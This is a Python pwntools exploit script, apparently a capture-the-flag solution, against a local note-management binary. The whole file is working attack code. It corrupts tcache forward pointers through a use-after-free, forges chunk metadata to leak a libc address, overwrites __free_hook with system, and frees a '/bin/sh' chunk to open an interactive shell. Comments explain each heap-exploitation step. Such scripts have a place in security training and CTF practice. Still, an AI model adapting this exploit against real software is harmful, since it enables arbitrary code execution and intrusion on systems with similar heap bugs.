#!/usr/bin/env python3

import os
import clipboard
from pwn import *

exe = ELF("./note_patched")
libc = ELF("./libc.so.6")

context.binary = exe
# context.log_level = 'debug'

def Add(index, size, context):
    # Context is byte
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline('{}'.format(index).encode())
    p.recvuntil(b'Note size: ')
    p.sendline('{}'.format(size).encode())
    p.recvuntil(b'Content: ')
    p.send(context)
    p.recvuntil(b'> ')

def Edit(index, context):
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline('{}'.format(index).encode())
    p.recvuntil(b'Content: ')
    p.send(context)
    p.recvuntil(b'> ')

def View(index):
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline('{}'.format(index).encode())
    return p.recvuntil(b'> ')

def Delete(index):
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline('{}'.format(index).encode())
    p.recvuntil(b'> ')


### Idea
# | Junk 0 (0x410 > 1024 bytes)       |
# | Junk 1 (0x20 avoid consolidating) |
# free(0) will give throw junk 0 to unsorted bin and write
# libc main arena to junk 0
###

while True:
    p = process('./note_patched')

    # Create 3 junks, the junk index=1 make sure there is not a heap consolidation
    # If input size is too small, our future payload may not be fit
    # If the address has null byte, strlen() will also end at null byte
    Add(0, 0x50, b'00000000')
    Add(1, 0x50, b'11111111')
    Add(2, 0x50, b'22222222')

    # Abuse link list
    Delete(0)
    Delete(2)

    # Change forward pointer
    Edit(2, b'\x90')

    Add(3, 0x50, b'33333333')
    payload = p64(0) + p64(0x421)
    Add(4, 0x50, payload)

    # Abuse link list
    Delete(2)
    Delete(1)

    # Change forward pointer
    Edit(1, p16(0x86b0))

    try:
        # After successfully add junk 6, we have a split between 
        # wild junk and the big junk with index 0
        Add(5, 0x50, b'55555555')
        payload = p64(0) + p64(0x21)        # Fake metadata of first chunk
        payload += p64(0)*2                 # Fake context
        payload += p64(0) + p64(0x21)        # Fake metadata of second chunk
        Add(6, 0x50, payload)

        # Add here
        Delete(0)
    except:
        p.close()
        continue

    leak_addr = u64(View(0).split(b': ')[1].split(b'\n')[0] + b'\x00'*2)
    print("[+] Leak address:", hex(leak_addr))

    libc_base = leak_addr - 0x1ebbe0
    print("[*] Libc base:", hex(libc_base))
    
    __free_hook_offset = libc.symbols['__free_hook']
    __free_hook_addr = libc_base + __free_hook_offset
    print("[*] __free_hook address:", hex(__free_hook_addr))
    
    system_offset = libc.symbols['system']
    system_addr = libc_base + system_offset
    print("[*] system address:", hex(system_addr))

    # Abuse link list
    Delete(2)
    Delete(1)

    # Change forward pointer to __free_hook so that we can
    # change value of __free_hook from null to system
    # then just run free(), which will execute __free_hook
    # (system)
    Edit(1, p64(__free_hook_addr))

    # Overwrite value of __free_hook
    Add(7, 0x50, b'/bin/sh\x00')
    Add(8, 0x50, p64(system_addr))

    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(b'7')

    p.interactive()